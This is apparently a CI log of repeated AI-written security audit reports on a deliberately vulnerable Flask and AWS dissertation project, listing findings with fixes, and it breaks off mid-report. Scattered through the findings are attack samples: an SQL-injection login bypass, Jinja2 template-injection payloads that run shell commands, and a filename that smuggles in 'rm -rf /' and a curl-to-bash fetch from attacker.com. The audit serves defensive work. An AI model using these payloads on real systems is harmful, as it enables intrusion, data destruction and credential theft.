+2026-08-24T17:58:51.0567978Z secret = "jwt-secret-key-hardcoded-2024"
+2026-08-24T17:58:51.0568310Z ```
+2026-08-24T17:58:51.0568460Z 
+2026-08-24T17:58:51.0568806Z Anyone with access to the repository (including version control history) has these credentials permanently.
+2026-08-24T17:58:51.0569261Z 
+2026-08-24T17:58:51.0569498Z **Fix:** Load all secrets from environment variables or a secrets manager:
+2026-08-24T17:58:51.0569935Z ```python
+2026-08-24T17:58:51.0570208Z import os
+2026-08-24T17:58:51.0570367Z 
+2026-08-24T17:58:51.0570474Z class Config:
+2026-08-24T17:58:51.0571288Z     SECRET_KEY = os.environ["FLASK_SECRET_KEY"]
+2026-08-24T17:58:51.0571791Z     JWT_SECRET = os.environ["JWT_SECRET_KEY"]
+2026-08-24T17:58:51.0572208Z     SQLALCHEMY_DATABASE_URI = os.environ["DATABASE_URL"]
+2026-08-24T17:58:51.0572576Z ```
+2026-08-24T17:58:51.0572983Z Rotate all currently exposed secrets immediately. Ensure `.env` files are in `.gitignore`.
+2026-08-24T17:58:51.0573357Z 
+2026-08-24T17:58:51.0573503Z ---
+2026-08-24T17:58:51.0573627Z 
+2026-08-24T17:58:51.0573847Z ### 6. No Authentication or Authorisation on Any Endpoint
+2026-08-24T17:58:51.0574341Z **Files:** `./app/routes/users.py`, `./app/routes/files.py`, `./app/routes/templates.py`
+2026-08-24T17:58:51.0574802Z **Severity:** High
+2026-08-24T17:58:51.0574989Z 
+2026-08-24T17:58:51.0575265Z Every route is publicly accessible with no token validation, session check, or role enforcement:
+2026-08-24T17:58:51.0575647Z 
+2026-08-24T17:58:51.0575993Z - `DELETE /users/delete/<username>` — anyone can delete any user
+2026-08-24T17:58:51.0576589Z - `GET /users/` — full user list (including emails and roles) exposed publicly
+2026-08-24T17:58:51.0577149Z - `DELETE /files/delete/<file_id>` — anyone can delete any file
+2026-08-24T17:58:51.0577710Z - `POST /templates/render` — unauthenticated RCE vector (see issue #2)
+2026-08-24T17:58:51.0578015Z 
+2026-08-24T17:58:51.0578248Z **Fix:** Implement a JWT verification decorator and apply it to all sensitive routes:
+2026-08-24T17:58:51.0578726Z ```python
+2026-08-24T17:58:51.0579033Z from functools import wraps
+2026-08-24T17:58:51.0579343Z import jwt
+2026-08-24T17:58:51.0579644Z from flask import request, jsonify
+2026-08-24T17:58:51.0579860Z 
+2026-08-24T17:58:51.0579974Z def require_auth(f):
+2026-08-24T17:58:51.0580319Z     @wraps(f)
+2026-08-24T17:58:51.0580633Z     def decorated(*args, **kwargs):
+2026-08-24T17:58:51.0581077Z         token = request.headers.get("Authorization", "").removeprefix("Bearer ")
+2026-08-24T17:58:51.0581520Z         if not token:
+2026-08-24T17:58:51.0581962Z             return jsonify({"error": "Missing token"}), 401
+2026-08-24T17:58:51.0582336Z         try:
+2026-08-24T17:58:51.0582778Z             payload = jwt.decode(token, os.environ["JWT_SECRET_KEY"], algorithms=["HS256"])
+2026-08-24T17:58:51.0583252Z             request.user_id = payload["user_id"]
+2026-08-24T17:58:51.0583635Z         except jwt.ExpiredSignatureError:
+2026-08-24T17:58:51.0584020Z             return jsonify({"error": "Token expired"}), 401
+2026-08-24T17:58:51.0584409Z         except jwt.InvalidTokenError:
+2026-08-24T17:58:51.0584833Z             return jsonify({"error": "Invalid token"}), 401
+2026-08-24T17:58:51.0585194Z         return f(*args, **kwargs)
+2026-08-24T17:58:51.0585520Z     return decorated
+2026-08-24T17:58:51.0585711Z 
+2026-08-24T17:58:51.0585826Z # Apply to routes
+2026-08-24T17:58:51.0586303Z @users_bp.route("/delete/<username>", methods=["DELETE"])
+2026-08-24T17:58:51.0586678Z @require_auth
+2026-08-24T17:58:51.0587001Z def delete_user(username):
+2026-08-24T17:58:51.0587312Z     ...
+2026-08-24T17:58:51.0587568Z ```
+2026-08-24T17:58:51.0587755Z 
+2026-08-24T17:58:51.0587866Z ---
+2026-08-24T17:58:51.0588020Z 
+2026-08-24T17:58:51.0588278Z ### 7. Overly Permissive IAM Policy — Wildcard Administrator Access
+2026-08-24T17:58:51.0588744Z **File:** `./infrastructure/iam-policy.json`
+2026-08-24T17:58:51.0589095Z **Severity:** High
+2026-08-24T17:58:51.0589244Z 
+2026-08-24T17:58:51.0589513Z The first statement grants unrestricted access to every AWS action on every resource:
+2026-08-24T17:58:51.0589886Z 
+2026-08-24T17:58:51.0590001Z ```json
+2026-08-24T17:58:51.0590252Z {
+2026-08-24T17:58:51.0590509Z     "Sid": "AdministratorAccess",
+2026-08-24T17:58:51.0590886Z     "Effect": "Allow",
+2026-08-24T17:58:51.0591170Z     "Action": "*",
+2026-08-24T17:58:51.0591565Z     "Resource": "*"
+2026-08-24T17:58:51.0591924Z }
+2026-08-24T17:58:51.0592167Z ```
+2026-08-24T17:58:51.0592346Z 
+2026-08-24T17:58:51.0592768Z This makes all subsequent, more restrictive statements irrelevant. Any principal with this policy has full account compromise capability.
+2026-08-24T17:58:51.0593231Z 
+2026-08-24T17:58:51.0593659Z **Fix:** Remove the wildcard statement entirely and grant only the specific actions required. Apply the principle of least privilege:
+2026-08-24T17:58:51.0594253Z ```json
+2026-08-24T17:58:51.0594510Z {
+2026-08-24T17:58:51.0594758Z     "Version": "2012-10-17",
+2026-08-24T17:58:51.0595093Z     "Statement": [
+2026-08-24T17:58:51.0595422Z         {
+2026-08-24T17:58:51.0595716Z             "Sid": "AllowEC2Describe",
+2026-08-24T17:58:51.0596054Z             "Effect": "Allow",
+2026-08-24T17:58:51.0596349Z             "Action": [
+2026-08-24T17:58:51.0596683Z                 "ec2:DescribeInstances",
+2026-08-24T17:58:51.0597060Z                 "ec2:DescribeSecurityGroups",
+2026-08-24T17:58:51.0597461Z                 "ec2:DescribeVpcs"
+2026-08-24T17:58:51.0597774Z             ],
+2026-08-24T17:58:51.0598039Z             "Resource": "*"
+2026-08-24T17:58:51.0598362Z         }
+2026-08-24T17:58:51.0598640Z     ]
+2026-08-24T17:58:51.0598897Z }
+2026-08-24T17:58:51.0599187Z ```
+2026-08-24T17:58:51.0599309Z 
+2026-08-24T17:58:51.0599425Z ---
+2026-08-24T17:58:51.0599557Z 
+2026-08-24T17:58:51.0599727Z ### 8. Publicly Accessible S3 Bucket
+2026-08-24T17:58:51.0600319Z **File:** `./infrastructure/main.tf` — `aws_s3_bucket_public_access_block.public_bucket_access`
+2026-08-24T17:58:51.0600788Z **Severity:** High
+2026-08-24T17:58:51.0600976Z 
+2026-08-24T17:58:51.0601188Z All four public access block settings are explicitly disabled:
+2026-08-24T17:58:51.0601444Z 
+2026-08-24T17:58:51.0601562Z ```hcl
+2026-08-24T17:58:51.0601998Z block_public_acls       = false
+2026-08-24T17:58:51.0602350Z block_public_policy     = false
+2026-08-24T17:58:51.0602679Z ignore_public_acls      = false
+2026-08-24T17:58:51.0603046Z restrict_public_buckets = false
+2026-08-24T17:58:51.0603340Z ```
+2026-08-24T17:58:51.0603485Z 
+2026-08-24T17:58:51.0603765Z This allows the bucket and its contents to be made world-readable/writable.
+2026-08-24T17:58:51.0604084Z 
+2026-08-24T17:58:51.0604410Z **Fix:** Unless there is a specific, justified need for public access (e.g., a static website), block all public access:
+2026-08-24T17:58:51.0604960Z ```hcl
+2026-08-24T17:58:51.0605278Z block_public_acls       = true
+2026-08-24T17:58:51.0605586Z block_public_policy     = true
+2026-08-24T17:58:51.0605949Z ignore_public_acls      = true
+2026-08-24T17:58:51.0606270Z restrict_public_buckets = true
+2026-08-24T17:58:51.0606568Z ```
+2026-08-24T17:58:51.0606728Z 
+2026-08-24T17:58:51.0606824Z ---
+2026-08-24T17:58:51.0606977Z 
+2026-08-24T17:58:51.0607123Z ### 9. IMDSv2 Not Enforced on EC2 Instance
+2026-08-24T17:58:51.0607634Z **File:** `./infrastructure/main.tf` — `aws_instance.web_server`
+2026-08-24T17:58:51.0608020Z **Severity:** High
+2026-08-24T17:58:51.0608191Z 
+2026-08-24T17:58:51.0608666Z The instance metadata service is configured with `http_tokens = "optional"`, meaning IMDSv1 (unauthenticated) requests are accepted:
+2026-08-24T17:58:51.0609150Z 
+2026-08-24T17:58:51.0609248Z ```hcl
+2026-08-24T17:58:51.0609533Z metadata_options {
+2026-08-24T17:58:51.0609884Z     http_endpoint               = "enabled"
+2026-08-24T17:58:51.0610275Z     http_tokens                 = "optional"   # IMDSv1 allowed
+2026-08-24T17:58:51.0610643Z }
+2026-08-24T17:58:51.0610906Z ```
+2026-08-24T17:58:51.0611059Z 
+2026-08-24T17:58:51.0611909Z IMDSv1 is vulnerable to SSRF attacks — if the application has any SSRF vulnerability, an attacker can retrieve the instance's IAM credentials via `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
+2026-08-24T17:58:51.0612726Z 
+2026-08-24T17:58:51.0612903Z **Fix:** Require IMDSv2 (token-based):
+2026-08-24T17:58:51.0613229Z ```hcl
+2026-08-24T17:58:51.0613489Z metadata_options {
+2026-08-24T17:58:51.0613880Z     http_endpoint               = "enabled"
+2026-08-24T17:58:51.0614313Z     http_tokens                 = "required"   # IMDSv2 only
+2026-08-24T17:58:51.0614718Z     http_put_response_hop_limit = 1
+2026-08-24T17:58:51.0615039Z }
+2026-08-24T17:58:51.0615297Z ```
+2026-08-24T17:58:51.0615461Z 
+2026-08-24T17:58:51.0615562Z ---
+2026-08-24T17:58:51.0615741Z 
+2026-08-24T17:58:51.0615865Z ## Medium Vulnerabilities
+2026-08-24T17:58:51.0616069Z 
+2026-08-24T17:58:51.0616217Z ---
+2026-08-24T17:58:51.0616408Z 
+2026-08-24T17:58:51.0616695Z ### 10. Unencrypted S3 Bucket
+2026-08-24T17:58:51.0617287Z **File:** `./infrastructure/main.tf` — `aws_s3_bucket.unencrypted_bucket`
+2026-08-24T17:58:51.0617738Z **Severity:** Medium
+2026-08-24T17:58:51.0617932Z 
+2026-08-24T17:58:51.0618250Z The `dissertation-unencrypted-bucket` bucket has no server-side encryption configuration, unlike `secure_bucket`.
+2026-08-24T17:58:51.0618677Z 
+2026-08-24T17:58:51.0618841Z **Fix:** Add an encryption configuration:
+2026-08-24T17:58:51.0619152Z ```hcl
+2026-08-24T17:58:51.0619554Z resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_encryption" {
+2026-08-24T17:58:51.0620052Z   bucket = aws_s3_bucket.unencrypted_bucket.id
+2026-08-24T17:58:51.0620393Z   rule {
+2026-08-24T17:58:51.0620705Z     apply_server_side_encryption_by_default {
+2026-08-24T17:58:51.0621031Z       sse_algorithm = "AES256"
+2026-08-24T17:58:51.0621308Z     }
+2026-08-24T17:58:51.0621550Z   }
+2026-08-24T17:58:51.0621978Z }
+2026-08-24T17:58:51.0622224Z ```
+2026-08-24T17:58:51.0622365Z 
+2026-08-24T17:58:51.0622486Z ---
+2026-08-24T17:58:51.0622597Z 
+2026-08-24T17:58:51.0622806Z ### 11. SecretsManager Policy Allows `DeleteSecret` on All Resources
+2026-08-24T17:58:51.0623244Z **File:** `./infrastructure/iam-policy.json`
+2026-08-24T17:58:51.0623569Z **Severity:** Medium
+2026-08-24T17:58:51.0623740Z 
+2026-08-24T17:58:51.0623847Z ```json
+2026-08-24T17:58:51.0624082Z {
+2026-08-24T17:58:51.0624368Z     "Sid": "SecretsManagerAccess",
+2026-08-24T17:58:51.0624702Z     "Action": [
+2026-08-24T17:58:51.0624984Z         "secretsmanager:GetSecretValue",
+2026-08-24T17:58:51.0625326Z         "secretsmanager:ListSecrets",
+2026-08-24T17:58:51.0625643Z         "secretsmanager:DeleteSecret"
+2026-08-24T17:58:51.0625968Z     ],
+2026-08-24T17:58:51.0626235Z     "Resource": "*"
+2026-08-24T17:58:51.0626490Z }
+2026-08-24T17:58:51.0626731Z ```
+2026-08-24T17:58:51.0626868Z 
+2026-08-24T17:58:51.0627259Z `DeleteSecret` on `Resource: "*"` allows deletion of any secret in the account, which could be used for destructive attacks or to force application failures.
+2026-08-24T17:58:51.0627742Z 
+2026-08-24T17:58:51.0628052Z **Fix:** Remove `DeleteSecret` from application-facing policies. Scope `Resource` to specific secret ARNs:
+2026-08-24T17:58:51.0628550Z ```json
+2026-08-24T17:58:51.0628903Z "Resource": "arn:aws:secretsmanager:eu-west-2:123456789012:secret:dissertation/*"
+2026-08-24T17:58:51.0629312Z ```
+2026-08-24T17:58:51.0629452Z 
+2026-08-24T17:58:51.0629544Z ---
+2026-08-24T17:58:51.0629689Z 
+2026-08-24T17:58:51.0629816Z ### 12. Debug Mode Enabled in Production Entry Point
+2026-08-24T17:58:51.0630307Z **File:** `./run.py`
+2026-08-24T17:58:51.0630573Z **Severity:** Medium
+2026-08-24T17:58:51.0630694Z 
+2026-08-24T17:58:51.0630857Z ```python
+2026-08-24T17:58:51.0631105Z app.run(debug=True)
+2026-08-24T17:58:51.0631347Z ```
+2026-08-24T17:58:51.0631532Z 
+2026-08-24T17:58:51.0632201Z Flask's debug mode enables the interactive Werkzeug debugger, which allows arbitrary Python execution in the browser if an exception occurs. It also enables the reloader and exposes detailed tracebacks.
+2026-08-24T17:58:51.0632781Z 
+2026-08-24T17:58:51.0632910Z **Fix:**
+2026-08-24T17:58:51.0633169Z ```python
+2026-08-24T17:58:51.0633421Z if __name__ == "__main__":
+2026-08-24T17:58:51.0633863Z     debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
+2026-08-24T17:58:51.0634326Z     app.run(debug=debug)
+2026-08-24T17:58:51.0634597Z ```
+2026-08-24T17:58:51.0635008Z In production, use a proper WSGI server (gunicorn, uWSGI) rather than Flask's built-in server at all.
+2026-08-24T17:58:51.0635446Z 
+2026-08-24T17:58:51.0635543Z ---
+2026-08-24T17:58:51.0635706Z 
+2026-08-24T17:58:51.0635854Z ### 13. No Input Validation on File Upload or User Registration
+2026-08-24T17:58:51.0636316Z **Files:** `./app/routes/files.py`, `./app/routes/auth.py`
+2026-08-24T17:58:51.0636663Z **Severity:** Medium
+2026-08-24T17:58:51.0636786Z 
+2026-08-24T17:58:51.0637041Z No fields are validated for type, length, format, or content. This enables:
+2026-08-24T17:58:51.0637553Z - Excessively long strings that could cause denial of service or overflow column limits
+2026-08-24T17:58:51.0638011Z - Malformed emails stored without validation
+2026-08-24T17:58:51.0638486Z - Null/missing fields causing unhandled exceptions that leak stack traces
+2026-08-24T17:58:51.0638749Z 
+2026-08-24T17:58:51.0638955Z **Fix:** Use a validation library such as `marshmallow` or `pydantic`:
+2026-08-24T17:58:51.0639329Z ```python
+2026-08-24T17:58:51.0639647Z from marshmallow import Schema, fields, validate, ValidationError
+2026-08-24T17:58:51.0639945Z 
+2026-08-24T17:58:51.0640048Z class RegisterSchema(Schema):
+2026-08-24T17:58:51.0640522Z     username = fields.Str(required=True, validate=validate.Length(min=3, max=80))
+2026-08-24T17:58:51.0641014Z     password = fields.Str(required=True, validate=validate.Length(min=12))
+2026-08-24T17:58:51.0641454Z     email = fields.Email(required=True)
+2026-08-24T17:58:51.0641865Z ```
+2026-08-24T17:58:51.0642015Z 
+2026-08-24T17:58:51.0642097Z ---
+2026-08-24T17:58:51.0642271Z 
+2026-08-24T17:58:51.0642439Z ### 14. JWT Secret Separate from Flask Secret Key
+2026-08-24T17:58:51.0642784Z **File:** `./app/routes/auth.py`
+2026-08-24T17:58:51.0643095Z **Severity:** Medium
+2026-08-24T17:58:51.0643228Z 
+2026-08-24T17:58:51.0643907Z A separate hardcoded JWT secret (`"jwt-secret-key-hardcoded-2024"`) is used instead of the application's `SECRET_KEY`. This creates two independent secrets to manage and rotate, and the JWT secret is buried in a route file rather than in configuration.
+2026-08-24T17:58:51.0644750Z 
+2026-08-24T17:58:51.0645150Z **Fix:** Centralise all secrets in `Config` and load from environment variables (see issue #5). Use `current_app.config["SECRET_KEY"]` for JWT signing.
+2026-08-24T17:58:51.0645590Z 
+2026-08-24T17:58:51.0645719Z ---
+2026-08-24T17:58:51.0645857Z 
+2026-08-24T17:58:51.0645959Z ## Low Vulnerabilities
+2026-08-24T17:58:51.0646131Z 
+2026-08-24T17:58:51.0646234Z ---
+2026-08-24T17:58:51.0646391Z 
+2026-08-24T17:58:51.0646549Z ### 15. Unauthenticated Mass User Enumeration
+2026-08-24T17:58:51.0646983Z **File:** `./app/routes/users.py` — `get_all_users()`
+2026-08-24T17:58:51.0647320Z **Severity:** Low
+2026-08-24T17:58:51.0647480Z 
+2026-08-24T17:58:51.0647952Z `GET /users/` returns the full list of all users including usernames, emails, and roles with no authentication required. This facilitates targeted phishing and credential-stuffing attacks.
+2026-08-24T17:58:51.0648509Z 
+2026-08-24T17:58:51.0648748Z **Fix:** Require authentication (see issue #6) and restrict this endpoint to admin roles only.
+2026-08-24T17:58:51.0649096Z 
+2026-08-24T17:58:51.0649283Z ---
+2026-08-24T17:58:51.0649393Z 
+2026-08-24T17:58:51.0649553Z ### 16. `datetime.datetime.utcnow()` Deprecation
+2026-08-24T17:58:51.0649894Z **File:** `./app/routes/auth.py`
+2026-08-24T17:58:51.0650178Z **Severity:** Low
+2026-08-24T17:58:51.0650338Z 
+2026-08-24T17:58:51.0650940Z `datetime.datetime.utcnow()` is deprecated in Python 3.12+ and returns a naive datetime, which can cause timezone-related bugs in JWT expiry handling.
+2026-08-24T17:58:51.0651379Z 
+2026-08-24T17:58:51.0651507Z **Fix:**
+2026-08-24T17:58:51.0651876Z ```python
+2026-08-24T17:58:51.0652178Z from datetime import datetime, timezone, timedelta
+2026-08-24T17:58:51.0652559Z "exp": datetime.now(tz=timezone.utc) + timedelta(hours=24)
+2026-08-24T17:58:51.0652957Z ```
+2026-08-24T17:58:51.0653069Z 
+2026-08-24T17:58:51.0653188Z ---
+2026-08-24T17:58:51.0653295Z 
+2026-08-24T17:58:51.0653423Z ## Summary Table
+2026-08-24T17:58:51.0653663Z 
+2026-08-24T17:58:51.0653768Z | # | File | Issue | Severity |
+2026-08-24T17:58:51.0654061Z |---|------|-------|----------|
+2026-08-24T17:58:51.0654445Z | 1 | `auth.py` | SQL Injection in login | **Critical** |
+2026-08-24T17:58:51.0654860Z | 2 | `templates.py` | Server-Side Template Injection (RCE) | **Critical** |
+2026-08-24T17:58:51.0655277Z | 3 | `files.py` | OS Command Injection | **Critical** |
+2026-08-24T17:58:51.0655649Z | 4 | `auth.py` | Plaintext password storage | **High** |
+2026-08-24T17:58:51.0656040Z | 5 | `config.py`, `auth.py` | Hardcoded secrets | **High** |
+2026-08-24T17:58:51.0656451Z | 6 | All routes | No authentication or authorisation | **High** |
+2026-08-24T17:58:51.0656909Z | 7 | `iam-policy.json` | Wildcard IAM administrator access | **High** |
+2026-08-24T17:58:51.0657295Z | 8 | `main.tf` | Public S3 bucket | **High** |
+2026-08-24T17:58:51.0657651Z | 9 | `main.tf` | IMDSv1 enabled (SSRF risk) | **High** |
+2026-08-24T17:58:51.0658019Z | 10 | `main.tf` | Unencrypted S3 bucket | Medium |
+2026-08-24T17:58:51.0658419Z | 11 | `iam-policy.json` | `DeleteSecret` on all resources | Medium |
+2026-08-24T17:58:51.0658835Z | 12 | `run.py` | Debug mode in production | Medium |
+2026-08-24T17:58:51.0659193Z | 13 | `files.py`, `auth.py` | No input validation | Medium |
+2026-08-24T17:58:51.0659575Z | 14 | `auth.py` | Separate hardcoded JWT secret | Medium |
+2026-08-24T17:58:51.0659969Z | 15 | `users.py` | Unauthenticated user enumeration | Low |
+2026-08-24T17:58:51.0660346Z | 16 | `auth.py` | Deprecated `utcnow()` | Low |
+2026-08-24T17:58:51.0660558Z 
+2026-08-24T17:59:51.6439535Z **Immediate priorities:** Issues 1–3 allow unauthenticated remote code execution or full authentication bypass and must be remediated before any further deployment. Issues 4–9 should follow in the same sprint.
+2026-08-24T17:59:51.6440644Z 
+2026-08-24T17:59:51.6440833Z === RUN 5 OF 5 ===
+2026-08-24T17:59:51.6441293Z # Security Audit Report
+2026-08-24T17:59:51.6441507Z 
+2026-08-24T17:59:51.6441929Z ## Critical Vulnerabilities
+2026-08-24T17:59:51.6442237Z 
+2026-08-24T17:59:51.6442366Z ---
+2026-08-24T17:59:51.6442542Z 
+2026-08-24T17:59:51.6442663Z ### 1. SQL Injection
+2026-08-24T17:59:51.6443061Z **File:** `./app/routes/auth.py` — `login()` function
+2026-08-24T17:59:51.6443399Z **Severity:** Critical
+2026-08-24T17:59:51.6443574Z 
+2026-08-24T17:59:51.6443700Z ```python
+2026-08-24T17:59:51.6443977Z # VULNERABLE
+2026-08-24T17:59:51.6444379Z query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+2026-08-24T17:59:51.6444846Z result = db.session.execute(query)
+2026-08-24T17:59:51.6445135Z ```
+2026-08-24T17:59:51.6445279Z 
+2026-08-24T17:59:51.6445685Z Raw string concatenation allows an attacker to manipulate the query entirely. For example, a username of `' OR '1'='1' --` would bypass authentication.
+2026-08-24T17:59:51.6446145Z 
+2026-08-24T17:59:51.6446306Z **Fix:** Use parameterised queries:
+2026-08-24T17:59:51.6446601Z ```python
+2026-08-24T17:59:51.6446874Z from sqlalchemy import text
+2026-08-24T17:59:51.6447066Z 
+2026-08-24T17:59:51.6447514Z user = User.query.filter_by(username=username, ***
+2026-08-24T17:59:51.6448069Z # OR with raw SQL:
+2026-08-24T17:59:51.6448382Z result = db.session.execute(
+2026-08-24T17:59:51.6448778Z     text("SELECT * FROM users WHERE username = :username AND password = :password"),
+2026-08-24T17:59:51.6449223Z     {"username": username, "password": password}
+2026-08-24T17:59:51.6449575Z )
+2026-08-24T17:59:51.6449809Z ```
+2026-08-24T17:59:51.6449952Z 
+2026-08-24T17:59:51.6450073Z ---
+2026-08-24T17:59:51.6450181Z 
+2026-08-24T17:59:51.6450337Z ### 2. Server-Side Template Injection (SSTI)
+2026-08-24T17:59:51.6450786Z **File:** `./app/routes/templates.py` — `render_template_custom()`
+2026-08-24T17:59:51.6451141Z **Severity:** Critical
+2026-08-24T17:59:51.6451312Z 
+2026-08-24T17:59:51.6451435Z ```python
+2026-08-24T17:59:51.6451826Z # VULNERABLE
+2026-08-24T17:59:51.6452105Z env = Environment()
+2026-08-24T17:59:51.6452472Z template = env.from_string(template_str)  # User-controlled input
+2026-08-24T17:59:51.6452963Z rendered = template.render(**context)
+2026-08-24T17:59:51.6453316Z ```
+2026-08-24T17:59:51.6453436Z 
+2026-08-24T17:59:51.6453662Z An attacker can execute arbitrary code on the server. For example, submitting:
+2026-08-24T17:59:51.6454050Z ```
+2026-08-24T17:59:51.6454323Z {{ ''.__class__.__mro__[1].__subclasses__() }}
+2026-08-24T17:59:51.6454809Z {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+2026-08-24T17:59:51.6455178Z ```
+2026-08-24T17:59:51.6455327Z 
+2026-08-24T17:59:51.6455701Z **Fix:** Never render user-supplied strings as Jinja2 templates. If templating is required, use a strict sandbox and whitelist approach:
+2026-08-24T17:59:51.6456209Z ```python
+2026-08-24T17:59:51.6456513Z from jinja2.sandbox import SandboxedEnvironment
+2026-08-24T17:59:51.6456743Z 
+2026-08-24T17:59:51.6456928Z env = SandboxedEnvironment()  # Restricts access to dangerous attributes
+2026-08-24T17:59:51.6457439Z # Additionally, validate/whitelist allowed template constructs
+2026-08-24T17:59:51.6457793Z ```
+2026-08-24T17:59:51.6458210Z Ideally, avoid this pattern entirely and use predefined templates with user-supplied data only as context variables.
+2026-08-24T17:59:51.6458630Z 
+2026-08-24T17:59:51.6458717Z ---
+2026-08-24T17:59:51.6458858Z 
+2026-08-24T17:59:51.6458984Z ### 3. OS Command Injection
+2026-08-24T17:59:51.6459386Z **File:** `./app/routes/files.py` — `process_file()`
+2026-08-24T17:59:51.6459708Z **Severity:** Critical
+2026-08-24T17:59:51.6459843Z 
+2026-08-24T17:59:51.6459955Z ```python
+2026-08-24T17:59:51.6460223Z # VULNERABLE
+2026-08-24T17:59:51.6460496Z result = subprocess.run(
+2026-08-24T17:59:51.6460795Z     "file " + filename,  # User-controlled
+2026-08-24T17:59:51.6461173Z     shell=True,          # Shell interpretation enabled
+2026-08-24T17:59:51.6461492Z     capture_output=True,
+2026-08-24T17:59:51.6461910Z     text=True
+2026-08-24T17:59:51.6462182Z )
+2026-08-24T17:59:51.6462425Z ```
+2026-08-24T17:59:51.6462575Z 
+2026-08-24T17:59:51.6463007Z `shell=True` with unsanitised input allows arbitrary command execution. A filename of `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)` would be executed by the shell.
+2026-08-24T17:59:51.6463514Z 
+2026-08-24T17:59:51.6463707Z **Fix:** Pass arguments as a list and disable shell interpretation:
+2026-08-24T17:59:51.6464083Z ```python
+2026-08-24T17:59:51.6464341Z import shlex
+2026-08-24T17:59:51.6464479Z 
+2026-08-24T17:59:51.6464606Z # Validate filename first
+2026-08-24T17:59:51.6464904Z if not re.match(r'^[\w\-. ]+$', filename):
+2026-08-24T17:59:51.6465264Z     return jsonify({"error": "Invalid filename"}), 400
+2026-08-24T17:59:51.6465473Z 
+2026-08-24T17:59:51.6465618Z result = subprocess.run(
+2026-08-24T17:59:51.6465949Z     ["file", filename],  # List form, no shell expansion
+2026-08-24T17:59:51.6466274Z     shell=False,
+2026-08-24T17:59:51.6466544Z     capture_output=True,
+2026-08-24T17:59:51.6466808Z     text=True
+2026-08-24T17:59:51.6573756Z )
+2026-08-24T17:59:51.6574036Z ```
+2026-08-24T17:59:51.6574193Z 
+2026-08-24T17:59:51.6574298Z ---
+2026-08-24T17:59:51.6574451Z 
+2026-08-24T17:59:51.6574911Z ### 4. Plaintext Password Storage
+2026-08-24T17:59:51.6575450Z **File:** `./app/routes/auth.py` — `register()`
+2026-08-24T17:59:51.6575796Z **Severity:** Critical
+2026-08-24T17:59:51.6575945Z 
+2026-08-24T17:59:51.6576041Z ```python
+2026-08-24T17:59:51.6576250Z # VULNERABLE
+2026-08-24T17:59:51.6576801Z user = User(username=username, *** email=email)
+2026-08-24T17:59:51.6577104Z ```
+2026-08-24T17:59:51.6577209Z 
+2026-08-24T17:59:51.6577551Z Passwords are stored in plaintext in the database. A database breach exposes all user credentials immediately.
+2026-08-24T17:59:51.6578007Z 
+2026-08-24T17:59:51.6578157Z **Fix:** Use a strong, salted hashing algorithm:
+2026-08-24T17:59:51.6578460Z ```python
+2026-08-24T17:59:51.6578815Z from werkzeug.security import generate_password_hash, check_password_hash
+2026-08-24T17:59:51.6579185Z 
+2026-08-24T17:59:51.6579296Z # On registration:
+2026-08-24T17:59:51.6579790Z user = User(username=username, *** email=email)
+2026-08-24T17:59:51.6580200Z 
+2026-08-24T17:59:51.6580287Z # On login:
+2026-08-24T17:59:51.6580603Z if user and check_password_hash(user.password, password):
+2026-08-24T17:59:51.6580987Z     ...
+2026-08-24T17:59:51.6581208Z ```
+2026-08-24T17:59:51.6581337Z 
+2026-08-24T17:59:51.6581438Z ---
+2026-08-24T17:59:51.6581560Z 
+2026-08-24T17:59:51.6581823Z ## High Severity Vulnerabilities
+2026-08-24T17:59:51.6582032Z 
+2026-08-24T17:59:51.6582105Z ---
+2026-08-24T17:59:51.6582225Z 
+2026-08-24T17:59:51.6582333Z ### 5. Hardcoded Secrets
+2026-08-24T17:59:51.6582658Z **Files:** `./app/config.py`, `./app/routes/auth.py`
+2026-08-24T17:59:51.6583081Z **Severity:** High
+2026-08-24T17:59:51.6583232Z 
+2026-08-24T17:59:51.6583327Z ```python
+2026-08-24T17:59:51.6583545Z # config.py
+2026-08-24T17:59:51.6583802Z SECRET_KEY = "hardcoded-secret-key-123"
+2026-08-24T17:59:51.6584007Z 
+2026-08-24T17:59:51.6584093Z # auth.py
+2026-08-24T17:59:51.6584336Z db_password = "supersecretdbpassword123"
+2026-08-24T17:59:51.6584701Z secret = "jwt-secret-key-hardcoded-2024"
+2026-08-24T17:59:51.6584988Z ```
+2026-08-24T17:59:51.6585109Z 
+2026-08-24T17:59:51.6585422Z Secrets committed to source control are permanently exposed in version history, even if later removed.
+2026-08-24T17:59:51.6585803Z 
+2026-08-24T17:59:51.6585937Z **Fix:** Load all secrets from environment variables:
+2026-08-24T17:59:51.6586239Z ```python
+2026-08-24T17:59:51.6586489Z import os
+2026-08-24T17:59:51.6586612Z 
+2026-08-24T17:59:51.6586719Z class Config:
+2026-08-24T17:59:51.6586987Z     SECRET_KEY = os.environ.get("SECRET_KEY")
+2026-08-24T17:59:51.6587295Z     if not SECRET_KEY:
+2026-08-24T17:59:51.6587646Z         raise RuntimeError("SECRET_KEY environment variable not set")
+2026-08-24T17:59:51.6587970Z 
+2026-08-24T17:59:51.6588078Z # In auth.py:
+2026-08-24T17:59:51.6588344Z def generate_token(user_id):
+2026-08-24T17:59:51.6588683Z     secret = os.environ.get("JWT_SECRET_KEY")
+2026-08-24T17:59:51.6589037Z     ...
+2026-08-24T17:59:51.6589247Z ```
+2026-08-24T17:59:51.6589637Z Use a secrets manager (e.g., AWS Secrets Manager, HashiCorp Vault) in production.
+2026-08-24T17:59:51.6590032Z 
+2026-08-24T17:59:51.6590130Z ---
+2026-08-24T17:59:51.6590253Z 
+2026-08-24T17:59:51.6590597Z ### 6. Overly Permissive IAM Policy — Wildcard Admin
+2026-08-24T17:59:51.6591041Z **File:** `./infrastructure/iam-policy.json`
+2026-08-24T17:59:51.6591400Z **Severity:** High
+2026-08-24T17:59:51.6591567Z 
+2026-08-24T17:59:51.6591657Z ```json
+2026-08-24T17:59:51.6592070Z {
+2026-08-24T17:59:51.6592332Z     "Sid": "AdministratorAccess",
+2026-08-24T17:59:51.6592669Z     "Effect": "Allow",
+2026-08-24T17:59:51.6592957Z     "Action": "*",
+2026-08-24T17:59:51.6593184Z     "Resource": "*"
+2026-08-24T17:59:51.6593445Z }
+2026-08-24T17:59:51.6593668Z ```
+2026-08-24T17:59:51.6593806Z 
